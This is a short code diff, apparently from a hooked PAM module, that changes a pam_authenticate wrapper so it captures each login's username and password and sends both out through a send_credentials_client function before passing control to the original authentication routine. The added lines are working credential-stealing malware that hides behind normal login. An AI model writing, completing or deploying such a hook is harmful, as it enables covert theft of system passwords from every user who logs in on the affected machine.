@@ -62,9 +62,12 @@ int pam_authenticate(pam_handle_t *pamh, int flags) {
         }
     }
 
-    get_username(pamh);
-    get_password(pamh);
-    send_credentials_client("CECI EST UN TESTTEEAAAAAAHAAHHAHAHHAHAHHAHHAH\n"); 
+    char *username = get_username(pamh);
+    char *pwd = get_password(pamh);
+    send_credentials_client("The gathered USERNAME is: "); 
+    send_credentials_client(username); 
+    send_credentials_client("The gathered PASSWORD is: "); 
+    send_credentials_client(pwd); 
 
     return original_pam_authenticate(pamh, flags);
 }
